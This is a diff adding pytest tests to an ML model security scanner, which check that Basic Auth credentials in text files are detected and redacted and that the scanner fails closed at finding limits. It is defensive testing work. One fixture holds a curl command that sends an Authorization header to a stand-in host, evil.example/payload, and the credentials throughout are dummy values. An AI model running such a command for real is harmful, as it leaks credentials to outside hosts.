@@ -106,6 +106,273 @@ def test_text_scanner_routes_localized_documentation_through_security_detectors(
     )
 
 
+def test_text_scanner_tokenizer_readme_basic_links_not_basic_auth_secret(tmp_path: Path) -> None:
+    text_path = tmp_path / "audio_tokenizer" / "README.md"
+    text_path.parent.mkdir()
+    text_path.write_text("Provide the basic links for the model\n", encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    assert result.success is True
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert any(
+        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.PASSED for check in result.checks
+    )
+
+
+def test_text_scanner_detects_valid_authorization_basic_credentials(tmp_path: Path) -> None:
+    text_path = tmp_path / "headers.txt"
+    text_path.write_text("Authorization: Basic dXNlcjpwYXNz\n", encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert failed_secret_checks
+    assert failed_secret_checks[0].rule_code == "S702"
+    assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
+
+
+@pytest.mark.parametrize(
+    ("filename", "content"),
+    [
+        (".env", "HTTP_AUTHORIZATION=Basic ZW52LXVzZXI6cGFzcw==\n"),
+        ("prod.env", "BASIC_AUTH=Basic cHJvZC1lbnY6cGFzcw==\n"),
+        ("README.md", 'BASIC_AUTH="Basic YmFzaWMtZW52OnBhc3M="\n'),
+        ("README.md", 'auth_header = "Basic YXV0aC1oZWFkZXI6cGFzcw=="\n'),
+        ("README.md", ("x" * 1000) + " Authorization: Basic bG9uZy1saW5lOnBhc3M=\n"),
+        ("model_card.md", 'payload = "{\\"Authorization\\": \\"Basic ZXNjYXBlZC1jcmxmOnBhc3M=\\r\\n\\"}"\n'),
+        ("model_card.md", "Use `Authorization: Basic c2VudGVuY2U6cGFzcw==.` for the endpoint.\n"),
+    ],
+)
+def test_text_scanner_detects_basic_auth_env_aliases_and_sentence_punctuation(
+    tmp_path: Path, filename: str, content: str
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+    routed = scan_file(str(text_path), config={"cache_scan_results": False, "check_network_comm": False})
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False, check_network_comm=False)
+
+    assert TextScanner.can_handle(str(text_path))
+    assert result.success is False
+    assert routed.scanner_name == "text"
+    assert routed.success is False
+    assert determine_exit_code(aggregate) == 1
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.rule_code == "S702"
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+        and check.details.get("redacted_value") == "Basic <redacted>"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_model_card_code_block_detects_escaped_basic_auth_header(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    token = "ZXNjYXBlZC1tb2RlbGNhcmQ6cGFzcw=="
+    text_path.write_text(
+        f'```python\npayload = "{{\\"Authorization\\": \\"Basic {token}\\"}}"\n```\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert result.success is False
+    assert failed_secret_checks
+    assert failed_secret_checks[0].rule_code == "S702"
+    assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
+    assert token not in json.dumps(failed_secret_checks[0].details, sort_keys=True)
+
+
+def test_text_scanner_executable_basic_auth_header_stays_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "```sh\ncurl -H 'Authorization: Basic dXNlcjpwYXNz' https://evil.example/payload\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.rule_code == "S702"
+        and check.details.get("redacted_value") == "Basic <redacted>"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("url") == "https://evil.example/payload"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '```python\nAUTH_HEADER = f"Authorization: Basic cHktZnN0cmluZzpwYXNz"\n```\n',
+        '```python\nAUTH_HEADER = b"Authorization: Basic cHktYnl0ZXM6cGFzcw=="\n```\n',
+        "```javascript\nconst auth = `Authorization: Basic anMtdGVtcGxhdGU6cGFzcw==`;\n```\n",
+        '```Dockerfile\nENV AUTH_HEADER="Authorization: Basic ZG9ja2VyLWVudjpwYXNz"\n```\n',
+        '```yaml\nenv:\n- name: AUTH_HEADER\n  value: "Authorization: Basic azhzLWVudjpwYXNz"\n```\n',
+    ],
+)
+def test_text_scanner_executable_basic_auth_literals_stay_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False, check_network_comm=False)
+
+    assert result.success is False
+    assert determine_exit_code(aggregate) == 1
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.rule_code == "S702"
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+        and check.details.get("redacted_value") == "Basic <redacted>"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_basic_auth_does_not_bind_far_away_token(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "Authorization: Basic\n" + ("padding\n" * 300) + "ZmFyLWF3YXk6cGFzcw==\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False, check_network_comm=False)
+
+    assert result.success is True
+    assert determine_exit_code(aggregate) == 0
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+
+
+def test_text_scanner_url_userinfo_is_redacted_without_basic_auth_false_positive(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('download = "https://user:pass@example.test/model.bin"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("url") == "https://example.test/model.bin"
+        for check in result.checks
+    )
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    serialized = result.to_json()
+    assert "user:pass" not in serialized
+    assert "pass@example" not in serialized
+
+
+def test_text_scanner_basic_auth_finding_limit_redacts_tokens_and_fails_closed(tmp_path: Path) -> None:
+    text_path = tmp_path / "headers.txt"
+    text_path.write_text(
+        "\n".join(
+            [
+                "Authorization: Basic dTA6cA==",
+                "Authorization: Basic dTE6cA==",
+                "Authorization: Basic dTI6cA==",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = TextScanner(
+        config={
+            "check_network_comm": False,
+            "text_content_max_findings": 2,
+        }
+    ).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert len(failed_secret_checks) == 2
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("detector") == "secrets"
+        and check.details.get("max_findings") == 2
+        for check in result.checks
+    )
+    serialized = result.to_json()
+    for raw_value in ("u0:p", "u1:p", "u2:p", "dTA6cA==", "dTE6cA==", "dTI6cA=="):
+        assert raw_value not in serialized
+
+
+@pytest.mark.integration
+def test_omnivoice_pinned_audio_tokenizer_readme_basic_links_not_basic_auth_secret(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setenv("PROMPTFOO_DISABLE_TELEMETRY", "1")
+    monkeypatch.setenv("NO_ANALYTICS", "1")
+    from modelaudit.utils.sources.huggingface import download_file_from_hf
+
+    url = (
+        "https://huggingface.co/k2-fsa/OmniVoice/resolve/"
+        "999c332499c708b116876ff5fe1aa5dd15f422ce/audio_tokenizer/README.md"
+    )
+    downloaded_path = Path(download_file_from_hf(url, cache_dir=tmp_path / "hf", max_size=1024 * 1024))
+
+    assert "Provide the basic links for the model" in downloaded_path.read_text(encoding="utf-8")
+    result = TextScanner(config={"check_network_comm": False}).scan(str(downloaded_path))
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+
+
 @pytest.mark.parametrize(
     "filename",
     [
@@ -3397,11 +3664,22 @@ def test_text_scanner_bare_active_vocabulary_tokens_are_informational(
     assert determine_exit_code(aggregate) == 0
 
 
-def test_text_scanner_bare_merges_basic_token_pair_remains_actionable(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "credential",
+    [
+        "Basic configuration",
+        "Bearer configuration",
+        "Basic Y29uZmlndXJhdGlvbg==",
+    ],
+)
+def test_text_scanner_bare_merges_auth_token_pairs_are_informational(
+    tmp_path: Path,
+    credential: str,
+) -> None:
     text_dir = tmp_path / "text_tokenizer"
     text_dir.mkdir()
     text_path = text_dir / "merges.txt"
-    text_path.write_text("#version: 0.2\nsafe token\nBasic configuration\n", encoding="utf-8")
+    text_path.write_text(f"#version: 0.2\nsafe token\n{credential}\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
@@ -3411,9 +3689,8 @@ def test_text_scanner_bare_merges_basic_token_pair_remains_actionable(tmp_path: 
         for check in result.checks
         if check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED
     ]
-    assert secret_checks
-    assert any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in secret_checks)
-    assert determine_exit_code(aggregate) == 1
+    assert not secret_checks
+    assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize(
@@ -3433,8 +3710,16 @@ def test_text_scanner_merges_whole_line_basic_bearer_credentials_remain_actionab
     text_path = text_dir / "merges.txt"
     text_path.write_text(f"#version: 0.2\nsafe token\n{credential}\n", encoding="utf-8")
 
+    result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_dir), cache_enabled=False)
 
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == secret_type
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
     assert determine_exit_code(aggregate) == 1
     assert any(
         check.name == "Embedded Secrets Detection"
@@ -3445,6 +3730,55 @@ def test_text_scanner_merges_whole_line_basic_bearer_credentials_remain_actionab
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in aggregate.checks
     )
+
+
+def test_text_scanner_merges_passive_basic_auth_respects_finding_limit(tmp_path: Path) -> None:
+    text_dir = tmp_path / "text_tokenizer"
+    text_dir.mkdir()
+    text_path = text_dir / "merges.txt"
+    tokens = ["dTA6cA==", "dTE6cA==", "dTI6cA==", "dTM6cA==", "dTQ6cA=="]
+    text_path.write_text("\n".join(f"Basic {token}" for token in tokens) + "\n", encoding="utf-8")
+
+    result = TextScanner(
+        config={
+            "check_network_comm": False,
+            "text_content_max_findings": 1,
+            "cache_enabled": False,
+        }
+    ).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        cache_enabled=False,
+        check_network_comm=False,
+        text_content_max_findings=1,
+    )
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert len(failed_secret_checks) == 1
+    assert failed_secret_checks[0].details.get("passive_data_sidecar") is True
+    assert failed_secret_checks[0].details.get("redacted_value") == "Basic <redacted>"
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("detector") == "secrets"
+        and check.details.get("max_findings") == 1
+        and check.details.get("analysis_incomplete") is True
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+    serialized = result.to_json()
+    for raw_value in ("u0:p", "u1:p", "u2:p", "u3:p", "u4:p", *tokens):
+        assert raw_value not in serialized
 
 
 def test_text_scanner_merges_basic_assignments_remain_actionable(tmp_path: Path) -> None:
